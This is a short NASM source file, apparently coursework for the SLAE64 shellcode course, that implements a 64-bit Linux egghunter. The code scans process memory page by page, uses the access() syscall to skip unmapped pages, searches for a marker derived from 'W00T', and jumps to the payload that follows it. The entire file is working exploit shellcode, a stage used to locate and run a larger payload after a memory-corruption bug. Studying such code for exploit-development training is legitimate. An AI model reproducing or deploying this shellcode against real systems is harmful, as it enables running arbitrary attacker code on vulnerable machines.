; Filename: egghunter64.nasm
; Author: SLAE64-14209

global _start
section .text

egg equ 'W00T'                ; for easy configuration

_start:
	  xor rsi, rsi              ; zeroize RSI register
	  mov rdi, rsi              ; start at 0x0

next_address:
	  or di,0xfff               ; PAGE_SIZE -> RDI
	  inc rdi                   ; RDI + 1 

next_step:
	  push 0x15 
	  pop rax                   ; syscall access() 21
	  syscall
	  cmp al, 0xf2              ; EFAULT?
	  jz next_address           ; if efault happens go back and start again

search:
	  mov eax, egg
	  dec al
	  scasd
	  jnz next_address

execution:
    jmp rdi                   ; egg found
